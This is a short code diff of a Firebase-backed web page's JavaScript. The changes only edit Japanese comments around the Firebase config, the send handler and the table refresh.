@@ -39,7 +39,7 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebas
 import { getDatabase, ref, get, query, orderByChild } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-database.js";
 import { getAuth, onAuthStateChanged, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-auth.js";
 
-// 🔹 Firebase 設定
+// 🔹 Firebase 設定（Realtime Database用）
 const firebaseConfig = {
   apiKey: "AIzaSyB65yYda5Y1bVM3q74HizAQSbRrOT014x0",
   authDomain: "daada-ae048.firebaseapp.com",
@@ -82,7 +82,7 @@ document.getElementById("sendBtn").addEventListener("click", async () => {
       body: JSON.stringify({ account, password, blockCount })
     });
     alert("送信成功");
-    showData(); // 送信後すぐデータ一覧を更新
+    showData(); // 送信後にデータ一覧を更新
   } catch(e) {
     alert("送信失敗: " + e.message);
   }
@@ -104,6 +104,7 @@ async function showData() {
   table.style.display = "table";
   noData.style.display = "none";
 
+  // 既存の行を削除
   while(table.rows.length > 1) table.deleteRow(1);
 
   snapshot.forEach(child => {
